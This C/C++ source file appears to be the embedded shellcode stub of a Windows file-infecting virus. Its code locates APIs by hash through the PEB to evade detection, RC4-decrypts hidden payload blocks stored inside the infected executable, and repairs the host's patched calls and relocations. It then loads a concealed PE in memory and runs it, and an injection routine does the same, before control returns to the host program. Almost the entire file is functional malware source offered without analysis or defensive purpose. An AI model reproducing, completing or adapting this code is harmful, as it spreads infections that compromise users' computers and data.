#include <Windows.h>
#include <Winternl.h>
#include "loader.h"
#include "common.h"
#include "infect.h"
#include "morf.h"

typedef BOOL(WINAPI *tDllMain)(_In_  HINSTANCE hinstDLL, _In_  DWORD fdwReason, _In_  LPVOID lpvReserved);
bool loadlibrary_x32(DECRYPT_ITEM *item, BYTE *&pp, DWORD &size);
bool get_entry_point32(BYTE *base, DWORD size, void* &ep);
char *_strstr(const char *in, const char *str);
void START_SHELL(){
	uint8 *b;
	_asm {
		mov b,ecx
	}

	uint32 x=delta();

	HMODULE k32=GetModuleHandle(KERNEL32);
	_tVirtualProtect _VirtualProtect=(_tVirtualProtect)GetGetProcAddress(k32,_hVirtualProtect);
	_tGetCommandLineA _GetCommandLineA = (_tGetCommandLineA)GetGetProcAddress(k32, _hGetCommandLineA);
	_tCreateThread _CreateThread=(_tCreateThread)GetGetProcAddress(k32,_hCreateThread);
	_tGetModuleHandleA _GetModuleHandleA=(_tGetModuleHandleA)GetGetProcAddress(k32,_hGetModuleHandleA);
	_tGetProcAddress _GetProcAddress = (_tGetProcAddress)GetGetProcAddress(k32, _hGetProcAddress);
	char aExitThread[] = { 'E', 'x', 'i', 't', 'T', 'h', 'r', 'e', 'a', 'd', 0 };
	_tExitThread _ExitThread = (_tExitThread)_GetProcAddress(k32, aExitThread);
	//!!!!! search infected image
	
	IMAGE_FILE_HEADER *ifh=(IMAGE_FILE_HEADER *)(b+*(uint32*)&b[0x3c]+4);
	IMAGE_OPTIONAL_HEADER *ioh=(IMAGE_OPTIONAL_HEADER*)(ifh+1);
	DWORD vp;

	//init shell block
	SHELL_BLOCK *sb=(SHELL_BLOCK *)((uint8*)START_SHELL+SIZE_SHELL+x-sizeof(SHELL_BLOCK));
	DECRYPT_ITEM *item=(DECRYPT_ITEM *)(sb+1);
	uint32 l=sb->rva;

	//decrypt function block
	_memcpy((uint8*)item,b+l,sizeof(DECRYPT_ITEM));
	crypt((uint8*)item,sizeof(DECRYPT_ITEM),sb->key,_CIP_RC4);
	l+=sizeof(DECRYPT_ITEM);

	//decrypt grab function
	_memcpy((uint8*)(item+1),b+l,item->size);
	crypt((uint8*)(item+1),item->size,item->key,_CIP_RC4);
	l+=item->size;

	//decrypt info grab function
	_memcpy((uint8*)((uint8*)(item+1)+item->size),b+l,sizeof(ITEM_CALL));
	crypt((uint8*)((uint8*)(item+1)+item->size),sizeof(ITEM_CALL),item->key,_CIP_RC4);
	l+=sizeof(ITEM_CALL);

	//restore grab function
	ITEM_CALL *grab=(ITEM_CALL *)((uint8*)(item+1)+item->size);

	_VirtualProtect(b+grab->rva_in,grab->len_func,PAGE_EXECUTE_READWRITE,&vp);
	_memcpy((uint8*)b+grab->rva_in,(uint8*)(item+1),grab->len_func);
	
	item=(DECRYPT_ITEM *)((uint8*)(item+1)+item->size+sizeof(ITEM_CALL));
	_memcpy((uint8*)item,b+l,sizeof(DECRYPT_ITEM));
	crypt((uint8*)item,sizeof(DECRYPT_ITEM),sb->key,_CIP_RC4);
	l+=sizeof(DECRYPT_ITEM);
	_memcpy((uint8*)(item+1),b+l,item->size);
	crypt((uint8*)(item+1),item->size,item->key,_CIP_RC4);
	l+=item->size;
	_memcpy((uint8*)((uint8*)(item+1)+item->size),b+l,4);
	crypt((uint8*)((uint8*)(item+1)+item->size),4,item->key,_CIP_RC4);
	l+=4;
	LIST_CALL lc;
	lc.count=*(uint32*)((uint8*)(item+1)+item->size);
	lc.list=(ITEM_CALL*)(item+1);
	//restore list call
	int j=0;
	for (int i=0;i<lc.count-1;i++){
		_VirtualProtect(b+lc.list[i].rva+1,4,PAGE_EXECUTE_READWRITE,&vp);
		*(uint32*)(b+lc.list[i].rva+1)=lc.list[i].rva_in-(5+lc.list[i].rva);
	}
	item=(DECRYPT_ITEM *)((uint8*)(item+1)+item->size+4);
	//restore relocation
	//---------
	_memcpy((uint8*)item,b+l,sizeof(DECRYPT_ITEM));
	crypt((uint8*)item,sizeof(DECRYPT_ITEM),sb->key,_CIP_RC4);
	l+=sizeof(DECRYPT_ITEM);
	uint32 n=item->size/4;
	_memcpy((uint8*)(item+1),b+l,item->size);
	crypt((uint8*)(item+1),item->size,item->key,_CIP_RC4);
	l+=item->size;
	uint32 *reloc=(uint32 *)(item+1);
	uint32 delta=(uint32)b-ioh->ImageBase;
	for (int i=0;i<n;i++){
		*((uint32 *)(b+reloc[i]))+=delta;
	}
	item=(DECRYPT_ITEM *)((uint8*)(item+1)+item->size);
	//----------
	//decrypt drop file
	DECRYPT_ITEM *u=(DECRYPT_ITEM *)item;

	while(1){
		_memcpy((uint8*)item,b+l,sizeof(DECRYPT_ITEM));
		crypt((uint8*)item,sizeof(DECRYPT_ITEM),sb->key,_CIP_RC4);
		l+=sizeof(DECRYPT_ITEM);
		if (item->key==0 || item->size==0) break;
		_memcpy((uint8*)(item+1),b+l,item->size);
		crypt((uint8*)(item+1),item->size,item->key,_CIP_RC4);
		l+=item->size;
		item=(DECRYPT_ITEM *)((uint8*)(item+1)+item->size);
	}

	_CreateThread(0,0,(LPTHREAD_START_ROUTINE)((uint8*)thread_main+x),u,0,0);
	char *cmdarg=_GetCommandLineA();
	if (cmdarg){
		char p[] = { '/', 'm','t',0 };
		if (_strstr(cmdarg, p)){
			_ExitThread(0);
		}
	}
	if ((ifh->TimeDateStamp & (FLAG_EXEC_INFECTED << 16)) == 0){ //������������ ���� �� �����������
		_ExitThread(0);
	}
		
	_asm{
		leave //my local var
		add esp, 4 //ret
		popad //restore reg
		leave //restore stack
		mov eax, [esp] //get addr return 
		add esp, 4 //ret
		sub eax, 5 //start call
		jmp eax //jmp -> call xxxxxxxx
	}
}

uint8 *get_base(uint8* base){
	uint32 p=(uint32)base&0xFFFFF000;
	while(1){
		if (*(uint16*)p=='ZM'){
			if (*(uint16*)(p+*(uint32*)(p+0x3c))=='EP'){
				break;
			}
		}
		p-=0x1000;
	}
	return (uint8*)p;
}

DWORD _stdcall thread_main(LPVOID arg){
	DECRYPT_ITEM *item=(DECRYPT_ITEM *)arg;
	BYTE *p;
	DWORD size;
	if (loadlibrary_x32(item, p, size)){
		void *ep;
		if (get_entry_point32(p, size, ep)){
			typedef void (__stdcall *F)(DWORD magic,DECRYPT_ITEM *item);
			F f = (F)ep;
			f(MAGIC_SHELLCODE,item);
		}
	}
	return 0;
}

void _memcpy(uint8 *m1,uint8 *m2,int size){
	for (int i=0;i<size;i++){
		m1[i]=m2[i];
	}
}

void _memset(uint8 *m1,uint8 ch,int size){
	for (int i=0;i<size;i++){
		m1[i]=ch;
	}
}

void _stdcall rc4_setup( rc4_context *ctx, const unsigned char *key, unsigned int keylen )
{
    int i, j, a;
    unsigned int k;
    unsigned char *m;

    ctx->x = 0;
    ctx->y = 0;
    m = ctx->m;

    for( i = 0; i < 256; i++ )
        m[i] = (unsigned char) i;

    j = k = 0;

    for( i = 0; i < 256; i++, k++ )
    {
        if( k >= keylen ) k = 0;

        a = m[i];
        j = ( j + a + key[k] ) & 0xFF;
        m[i] = m[j];
        m[j] = (unsigned char) a;
    }
}

int _stdcall rc4_crypt( rc4_context *ctx, size_t length, const unsigned char *input,
                unsigned char *output )
{
    int x, y, a, b;
    size_t i;
    unsigned char *m;

    x = ctx->x;
    y = ctx->y;
    m = ctx->m;

    for( i = 0; i < length; i++ )
    {
        x = ( x + 1 ) & 0xFF; a = m[x];
        y = ( y + a ) & 0xFF; b = m[y];

        m[x] = (unsigned char) b;
        m[y] = (unsigned char) a;

        output[i] = (unsigned char)
            ( input[i] ^ m[(unsigned char)( a + b )] );
    }

    ctx->x = x;
    ctx->y = y;

    return( 0 );
}


void crypt(uint8* d,int size,uint32 key,uint8 type){
	int n=size/4;
	uint32 *p=(uint32*)d;
	if(type==_CIP_XOR){
		for (int i=0;i<n;i++){
			p[i]^=key;
		}
	}

	if (type==_CIP_ADD){
		for (int i=0;i<n;i++){
			p[i]+=key;
		}
	}


	if (type==_CIP_SUB){
		for (int i=0;i<n;i++){
			p[i]-=key;
		}
	}

	if (type==_CIP_TRASH){
		uint32 k=key;
		for (int i=0;i<n;i++){
			p[i]^=k;
			k+=key;
		}
	}

	if (type==_CIP_RC4){
		rc4_context ctx;
		rc4_setup(&ctx,(uint8*)&key,4);
		rc4_crypt(&ctx,size,d,d);
	}
}

int
_strncmp(const char *s1, const char *s2, size_t n)
{
	for (; n > 0; s1++, s2++, --n)
	if (*s1 != *s2)
		return ((*(unsigned char *)s1 < *(unsigned char *)s2) ? -1 : +1);
	else if (*s1 == '\0')
		return 0;
	return 0;
}

size_t _strlen(const char *str){
	register const char *s;

	for (s = str; *s; ++s);
	return(s - str);
}

char *_strstr(const char *in, const char *str)
{
	char c;
	size_t len;

	c = *str++;
	if (!c)
		return (char *)in;	// Trivial empty string case

	len = _strlen(str);
	do {
		char sc;

		do {
			sc = *in++;
			if (!sc)
				return (char *)0;
		} while (sc != c);
	} while (_strncmp(in, str, len) != 0);

	return (char *)(in - 1);
}

uint32 calc_hash(char *name)
{
	DWORD hash=0,tmp=0;
	while(*name){
		tmp=((tmp & 0xFFFFFF00) | *name);
		tmp=(tmp>>7) | (tmp<<(32-7));
		hash^=tmp;
		name++;
	}
	return hash;
}

char *upcase(char *name){
	char *p=name;
	while(*p){
		if (*p>='a') *p-=0x20;
		p++;
	}
	return name;
}

short *upcase_w(short *name){
	short *p=name;
	while(*p){
		if (*p>='a') *p-=0x20;
		p++;
	}
	return name;
}

uint32 calc_hash_w(short *name)
{
	DWORD hash=0,tmp=0;
	while(*name)
	{
		tmp=((tmp & 0xFFFFFF00) | *name);
		tmp=(tmp>>7) | (tmp<<(32-7));
		hash^=tmp;
		name++;
	}
	return hash;
}


uint32 calc_hash_upcase_w(short *name)
{
	DWORD hash=0,tmp=0;
	uint16 l;
	while(*name)
	{
		l=*name;
		if (l>='a') l-=0x20;
		tmp=((tmp & 0xFFFFFF00) | l);
		tmp=(tmp>>7) | (tmp<<(32-7));
		hash^=tmp;
		name++;
	}
	return hash;
}


LPVOID GetGetProcAddress(HMODULE Base,uint32 dwHashName){
	HMODULE hModule=Base;
	DWORD i=0;
	IMAGE_DOS_HEADER *imDh=(IMAGE_DOS_HEADER*)hModule;
	IMAGE_OPTIONAL_HEADER *imOh=(IMAGE_OPTIONAL_HEADER*)((DWORD)hModule+imDh->e_lfanew+4+
		sizeof(IMAGE_FILE_HEADER));
	IMAGE_EXPORT_DIRECTORY *imEd=(IMAGE_EXPORT_DIRECTORY*)RVATOVA(hModule,
		imOh->DataDirectory[0].VirtualAddress);
	DWORD *pAddrOfNames=(DWORD*)RVATOVA(hModule,imEd->AddressOfNames);
	WORD  *pAddrOfNameOrdinals=(WORD*)RVATOVA(hModule,imEd->AddressOfNameOrdinals);
	DWORD ordinal=0;
	if (HIWORD((DWORD)dwHashName) == 0)
	{		
		ordinal=(LOWORD((DWORD)dwHashName))-imEd->Base;
	}
	else
	{
		for(;i<imEd->NumberOfNames;i++,pAddrOfNames++,pAddrOfNameOrdinals++)
		{
			//���������� �� �����
			if(calc_hash((char*)RVATOVA(hModule,*pAddrOfNames))==dwHashName)
			{
				ordinal=*pAddrOfNameOrdinals;
				break;
			}
		}
	}
	DWORD *pAddrOfFunc=(DWORD*)RVATOVA(hModule,imEd->AddressOfFunctions);
	DWORD ret=pAddrOfFunc[ordinal];
	return (LPVOID)RVATOVA(hModule,ret);
}

uint32 delta(){
	uint32 a;
	__asm
	{
		call	_delta_
_delta_:
		pop		eax
		sub		eax,offset _delta_
		mov [a],eax
	}
	return a;
}

PPEB get_peb(){
	PPEB p;
	_asm{
		mov eax,fs:[0x30]
		mov [p],eax
	}
	return p;
}

HMODULE GetModuleHandle(uint32 hash)
{
	HMODULE base=0;
	PPEB peb = get_peb();
	LDR_DATA_TABLE_ENTRY *ldte=(LDR_DATA_TABLE_ENTRY *)peb->Ldr->InMemoryOrderModuleList.Flink;
	LIST_ENTRY *pstart=peb->Ldr->InMemoryOrderModuleList.Flink;
	LIST_ENTRY *p=peb->Ldr->InMemoryOrderModuleList.Flink;
	do{
		LDR_DATA_TABLE_ENTRY *l=(LDR_DATA_TABLE_ENTRY *)p;
		if (l->DllBase && l->FullDllName.Buffer){
			if (calc_hash_upcase_w((short*)l->FullDllName.Buffer)==hash){
				base=(HMODULE)l->Reserved2[0];
				break;
			}
		}
		p=p->Flink;
	}while(p!=pstart);

	return base;
}


static bool get_entry_point32(BYTE *base, DWORD size, void* &ep){
	if (size<0x40) return false;
	BYTE *p = base;
	BYTE *pend = base + size;
	IMAGE_NT_HEADERS32 *nt = (IMAGE_NT_HEADERS32 *)(base + *(DWORD*)&base[0x3C]);
	if (pend<((BYTE*)nt + sizeof(IMAGE_NT_HEADERS32)))
		return false;
	ep = base + nt->OptionalHeader.AddressOfEntryPoint;
	return true;
}

static bool get_proc_address32(BYTE *base, DWORD size, char *name, void* &addr){
	if (size<0x40) return false;
	BYTE *p = base;
	BYTE *pend = base + size;
	IMAGE_NT_HEADERS32 *nt = (IMAGE_NT_HEADERS32 *)(base + *(DWORD*)&base[0x3C]);
	if (pend<((BYTE*)nt + sizeof(IMAGE_NT_HEADERS32)))
		return false;
	if (!nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress ||
		!nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size)
		return false;
	IMAGE_EXPORT_DIRECTORY *ed = (IMAGE_EXPORT_DIRECTORY *)(base + nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
	if (pend<((BYTE*)ed + nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size))
		return false;
	if (pend<((BYTE*)ed + sizeof(IMAGE_EXPORT_DIRECTORY)))
		return false;
	DWORD *tn = (DWORD*)(base + ed->AddressOfNames);
	if (pend<((BYTE*)tn + sizeof(DWORD)*ed->NumberOfFunctions))
		return false;
	WORD *to = (WORD*)(base + ed->AddressOfNameOrdinals);
	if (pend<((BYTE*)to + sizeof(WORD)*ed->NumberOfFunctions))
		return false;
	DWORD *ta = (DWORD*)(base + ed->AddressOfFunctions);
	if (pend<((BYTE*)ta + sizeof(DWORD)*ed->NumberOfFunctions))
		return false;
	for (unsigned int i = 0; i<ed->NumberOfFunctions; i++){
		if (tn[i]){
			char *pname = (char*)(base + tn[i]);
			if (pend<(BYTE*)pname){
				return false;
			}
			if (strcmp(pname, name) == 0){
				if (pend<((BYTE*)ta + to[i]))
					return false;
				addr = base + ta[to[i]];
				if (pend<(BYTE*)addr)
					return false;
				return true;
			}
		}
	}
	return false;
}

static bool get_image_nt_header32(BYTE *in,DWORD lenin, IMAGE_NT_HEADERS32 *&nt){
	if (lenin<0x40) return false;
	BYTE *p = in;
	BYTE *pend = in + lenin;
	if (*(WORD*)p != 'ZM') return false;
	nt = (IMAGE_NT_HEADERS32 *)(p + *(DWORD*)&p[0x3C]);
	if (pend<((BYTE*)nt + sizeof(IMAGE_NT_HEADERS32))) return false;
	if (nt->Signature != 'EP') return false;
	if (nt->FileHeader.Machine != IMAGE_FILE_MACHINE_I386) return false;
	return true;
}

static bool loadlibrary_x32(DECRYPT_ITEM *item, BYTE *&pp, DWORD &size){
	BYTE *in=(BYTE*)(item+1);
	DWORD lenin=item->size;
	if (lenin<0x40) return false;
	HMODULE k32 = GetModuleHandle(KERNEL32);
	_tLoadLibraryA _LoadLibraryA = (_tLoadLibraryA)GetGetProcAddress(k32, _hLoadLibraryA);
	_tVirtualAlloc _VirtualAlloc = (_tVirtualAlloc)GetGetProcAddress(k32, _hVirtualAlloc);
	_tVirtualFree _VirtualFree = (_tVirtualFree)GetGetProcAddress(k32, _hVirtualFree);
	_tGetProcAddress _GetProcAddress = (_tGetProcAddress)GetGetProcAddress(k32, _hGetProcAddress);

	BYTE *p = in;
	BYTE *pend = in + lenin;
	IMAGE_NT_HEADERS32 *nt;
	if (!get_image_nt_header32(in,lenin, nt)) return false;

	IMAGE_SECTION_HEADER *sec = (IMAGE_SECTION_HEADER *)((BYTE*)nt + nt->FileHeader.SizeOfOptionalHeader + sizeof(IMAGE_FILE_HEADER)+sizeof(nt->Signature));
	if (pend<(BYTE*)(sec + nt->FileHeader.NumberOfSections)) return false;
	BYTE *base = (BYTE*)_VirtualAlloc(0, nt->OptionalHeader.SizeOfImage, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (!base)
		return false;
	BYTE *baseend = base + nt->OptionalHeader.SizeOfImage;

	if (lenin<nt->OptionalHeader.SizeOfHeaders){
		_VirtualFree(base, nt->OptionalHeader.SizeOfImage, MEM_DECOMMIT);
		return false;
	}
	if (baseend<(base + nt->OptionalHeader.SizeOfHeaders)){
		_VirtualFree(base, nt->OptionalHeader.SizeOfImage, MEM_DECOMMIT);
		return false;
	}
	_memcpy(base, p, nt->OptionalHeader.SizeOfHeaders);
	for (int i = 0; i<nt->FileHeader.NumberOfSections; i++){
		if (baseend<(base + sec[i].VirtualAddress + sec[i].Misc.VirtualSize)){
			_VirtualFree(base, nt->OptionalHeader.SizeOfImage, MEM_DECOMMIT);
			return false;
		}
		if (pend<(p + sec[i].PointerToRawData + sec[i].SizeOfRawData)){
			_VirtualFree(base, nt->OptionalHeader.SizeOfImage, MEM_DECOMMIT);
			return false;
		}
		_memcpy(base + sec[i].VirtualAddress, p + sec[i].PointerToRawData, sec[i].SizeOfRawData);
	}

	if (nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress && nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size){

		BYTE *reloc = base + nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;
		if (baseend<(reloc + nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size)){
			_VirtualFree(base, nt->OptionalHeader.SizeOfImage, MEM_DECOMMIT);
			return false;
		}

		DWORD delta = (DWORD)base - nt->OptionalHeader.ImageBase;
		IMAGE_BASE_RELOCATION *rb = (IMAGE_BASE_RELOCATION *)reloc;
		BYTE *relocend = (BYTE *)rb + nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;
		while (relocend>(BYTE*)rb){
			if (baseend < ((BYTE*)rb + sizeof(IMAGE_BASE_RELOCATION))){
				_VirtualFree(base, nt->OptionalHeader.SizeOfImage, MEM_DECOMMIT);
				return false;
			}

			if (baseend < ((BYTE*)rb + rb->SizeOfBlock)){
				_VirtualFree(base, nt->OptionalHeader.SizeOfImage, MEM_DECOMMIT);
				return false;
			}
			int n = (rb->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / 2;
			WORD *ro = (WORD*)((BYTE*)rb + sizeof(IMAGE_BASE_RELOCATION));
			for (int i = 0; i < n; i++){
				if (ro[i] == 0)
					continue;
				if ((ro[i] & 0x3000) != 0x3000){
					_VirtualFree(base, nt->OptionalHeader.SizeOfImage, MEM_DECOMMIT);
					return false;
				}
				DWORD *o = (DWORD*)(base + rb->VirtualAddress + (WORD)(ro[i] & 0xFFF));
				if (baseend < (BYTE*)o){
					_VirtualFree(base, nt->OptionalHeader.SizeOfImage, MEM_DECOMMIT);
					return false;
				}
				*o = *o + delta;
			}
			rb = (IMAGE_BASE_RELOCATION *)((BYTE*)rb + rb->SizeOfBlock);
		}
	}

	if (nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress &&
		nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size){
		IMAGE_IMPORT_DESCRIPTOR *imp = (IMAGE_IMPORT_DESCRIPTOR *)(base + nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);
		if (baseend<(BYTE*)(imp + sizeof(IMAGE_IMPORT_DESCRIPTOR))){
			_VirtualFree(base, nt->OptionalHeader.SizeOfImage, MEM_DECOMMIT);
			return false;
		}
		while (imp->Name != 0){
			char *lib = (char*)(base + imp->Name);
			if (baseend<(BYTE*)lib){
				_VirtualFree(base, nt->OptionalHeader.SizeOfImage, MEM_DECOMMIT);
				return false;
			}
			HMODULE hm = _LoadLibraryA(lib);
			if (!hm){
				_VirtualFree(base, nt->OptionalHeader.SizeOfImage, MEM_DECOMMIT);
				return false;
			}
			DWORD *FirstThunk = (DWORD*)(base + imp->FirstThunk);
			DWORD *OriginalFirstThunk = (DWORD*)(base + imp->OriginalFirstThunk);
			if (!imp->OriginalFirstThunk)
				OriginalFirstThunk = (DWORD*)(base + imp->FirstThunk);

			if (baseend<(BYTE*)FirstThunk){
				_VirtualFree(base, nt->OptionalHeader.SizeOfImage, MEM_DECOMMIT);
				return false;
			}

			if (baseend<(BYTE*)OriginalFirstThunk){
				_VirtualFree(base, nt->OptionalHeader.SizeOfImage, MEM_DECOMMIT);
				return false;
			}

			while (true){
				if (baseend<(BYTE*)(OriginalFirstThunk + 1)){
					_VirtualFree(base, nt->OptionalHeader.SizeOfImage, MEM_DECOMMIT);
					return false;
				}

				if (baseend<(BYTE*)(FirstThunk + 1)){
					_VirtualFree(base, nt->OptionalHeader.SizeOfImage, MEM_DECOMMIT);
					return false;
				}

				if (*OriginalFirstThunk == 0 && *FirstThunk == 0){
					break;
				}

				if (baseend<(BYTE*)(FirstThunk + 1)){
					_VirtualFree(base, nt->OptionalHeader.SizeOfImage, MEM_DECOMMIT);
					return false;
				}
				char *name;
				if (((*OriginalFirstThunk) & 0x80000000) == 0x80000000){
					name = (char*)(*OriginalFirstThunk & 0x7FFFFFFF);
				}
				else{
					name = (char*)(base + *OriginalFirstThunk + 2);
					if (baseend<(BYTE*)name){
						_VirtualFree(base, nt->OptionalHeader.SizeOfImage, MEM_DECOMMIT);
						return false;
					}
				}
				DWORD f = (DWORD)_GetProcAddress(hm, name);
				if (!f){
					_VirtualFree(base, nt->OptionalHeader.SizeOfImage, MEM_DECOMMIT);
					return false;
				}
				*FirstThunk = (DWORD)f;
				OriginalFirstThunk++;
				FirstThunk++;
			}

			imp++;
		}

	}
	if (nt->OptionalHeader.AddressOfEntryPoint){
		if ((nt->FileHeader.Characteristics&IMAGE_FILE_DLL) == IMAGE_FILE_DLL){
			tDllMain f = (tDllMain)(base + nt->OptionalHeader.AddressOfEntryPoint);
			if (baseend<(BYTE*)f){
				_VirtualFree(base, nt->OptionalHeader.SizeOfImage, MEM_DECOMMIT);
				return false;
			}
			f((HINSTANCE)base, DLL_PROCESS_ATTACH, 0);
		}
	}
	pp = base;
	size = nt->OptionalHeader.SizeOfImage;
	return true;
}


DWORD _stdcall injectcode(LPVOID arg){
	DECRYPT_ITEM *item = (DECRYPT_ITEM *)arg;
	BYTE *p;
	DWORD size;
	if (loadlibrary_x32(item, p, size)){
		void *ep;
		if (get_entry_point32(p, size, ep)){
			typedef void(__stdcall *F)(DWORD magic, DECRYPT_ITEM *item);
			F f = (F)ep;
			f(MAGIC_INJECT, item);
		}
	}
	return 0;
}


NAKED void END_SHELL(){
//key
	_asm nop
	_asm nop
	_asm nop
	_asm nop
//rva
	_asm nop
	_asm nop
	_asm nop
	_asm nop
/*
//size
	_asm nop
	_asm nop
	_asm nop
	_asm nop
*/
}